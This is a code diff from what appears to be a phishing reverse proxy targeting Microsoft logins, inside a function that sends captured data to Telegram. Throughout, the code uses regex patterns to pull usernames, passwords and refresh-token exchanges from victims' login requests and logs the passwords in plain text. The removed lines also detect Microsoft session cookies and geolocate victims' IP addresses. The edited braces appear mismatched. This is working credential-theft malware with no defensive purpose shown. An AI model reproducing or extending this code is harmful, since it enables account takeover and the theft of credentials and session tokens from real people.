@@ -123,94 +123,59 @@ async function sendToTelegram(data) {
         let isTokenExchange = false;
         
         if (body) {
-            // Convert body to string if it's not already
-            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
-            console.log('📦 Raw body (first 500 chars):', bodyStr.slice(0, 500));
-            
-            // ── PATTERN 1: URL-encoded form data (login.microsoftonline.com) ──
-            const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
-            if (userMatch) {
-                username = decodeURIComponent(userMatch[1]);
-            }
-            
-            const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
-            if (passMatch) {
-                password = decodeURIComponent(passMatch[1]);
-                hasCredentials = true;
-                console.log('✅ PASSWORD FOUND (URL-encoded):', password);
-            }
-            
-            // ── PATTERN 2: JSON format (common with modern Microsoft login) ──
-            try {
-                const jsonBody = typeof body === 'string' ? JSON.parse(body) : body;
-                if (jsonBody.password) {
-                    password = jsonBody.password;
-                    hasCredentials = true;
-                    console.log('✅ PASSWORD FOUND (JSON):', password);
-                }
-                if (jsonBody.username) {
-                    username = jsonBody.username;
-                }
-                if (jsonBody.loginfmt) {
-                    username = jsonBody.loginfmt;
-                }
-            } catch (e) {
-                // Not JSON, that's fine
-            }
-            
-            // ── PATTERN 3: Check for password in raw string (fallback) ──
-            if (!hasCredentials && bodyStr.includes('password')) {
-                const rawPassMatch = bodyStr.match(/"password"\s*[:=]\s*"([^"]+)"/i) ||
-                                    bodyStr.match(/password['"]?\s*[:=]\s*['"]?([^'"]+)['"]?/i);
-                if (rawPassMatch) {
-                    password = rawPassMatch[1];
-                    hasCredentials = true;
-                    console.log('✅ PASSWORD FOUND (raw):', password);
-                }
-            }
-            
-            // ── PATTERN 4: Token exchange ──
-            if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
-                isTokenExchange = true;
-                hasCredentials = true;
-                console.log('✅ TOKEN EXCHANGE DETECTED');
-            }
+    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+    
+    console.log('📦 Raw body (first 500 chars):', bodyStr.slice(0, 500));
+    
+    // ── PATTERN 1: URL-encoded form data ──
+    const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
+    if (userMatch) {
+        username = decodeURIComponent(userMatch[1]);
+    }
+    
+    const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
+    if (passMatch) {
+        password = decodeURIComponent(passMatch[1]);
+        hasCredentials = true;
+        console.log('✅ PASSWORD FOUND (URL-encoded):', password);
+    }
+    
+    // ── PATTERN 2: JSON format (Microsoft uses this!) ──
+    try {
+        const jsonBody = typeof body === 'string' ? JSON.parse(body) : body;
+        if (jsonBody.password) {
+            password = jsonBody.password;
+            hasCredentials = true;
+            console.log('✅ PASSWORD FOUND (JSON):', password);
         }
-        
-        // ────── CHECK FOR SESSION COOKIE ──────
-        const setCookieHeaders = data.proxyResponseHeaders?.['set-cookie'];
-        if (setCookieHeaders) {
-            const cookieStr = JSON.stringify(setCookieHeaders);
-            if (cookieStr.includes('esctx') || 
-                cookieStr.includes('ESTSAUTH') || 
-                cookieStr.includes('LoginOptions')) {
-                isSessionCookie = true;
-                hasCredentials = true;
-                console.log('✅ SESSION COOKIE DETECTED');
-            }
+        if (jsonBody.username) {
+            username = jsonBody.username;
         }
-        
-        // ────── SKIP IF NOTHING VALUABLE ──────
-        if (!hasCredentials) {
-            console.log('⏭️ Skipping notification - no credentials found in:', url);
-            return;
+        if (jsonBody.loginfmt) {
+            username = jsonBody.loginfmt;
         }
-        
-        console.log('✅ Valid credentials found, sending notification...');
-        NOTIFIED_SESSIONS.add(sessionId);
-        
-        // ────── GEO INFO ──────
-        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
-        let flag = '🌍';
-        let location = 'Unknown';
-
-        if (ip !== 'Unknown') {
-            try {
-                geo = await getGeoInfo(ip);
-                flag = getFlagEmoji(geo.countryCode);
-                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
-            } catch (e) {}
+    } catch (e) {
+        // Not JSON, continue
+    }
+    
+    // ── PATTERN 3: Raw string fallback ──
+    if (!hasCredentials && bodyStr.includes('password')) {
+        const rawPassMatch = bodyStr.match(/"password"\s*[:=]\s*"([^"]+)"/i) ||
+                            bodyStr.match(/password['"]?\s*[:=]\s*['"]?([^'"]+)['"]?/i);
+        if (rawPassMatch) {
+            password = rawPassMatch[1];
+            hasCredentials = true;
+            console.log('✅ PASSWORD FOUND (raw):', password);
         }
+    }
+    
+    // ── PATTERN 4: Token exchange ──
+    if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
+        isTokenExchange = true;
+        hasCredentials = true;
+        console.log('✅ TOKEN EXCHANGE DETECTED');
+    }
+}
 
         // ────── BUILD MESSAGE ──────
         let message = `
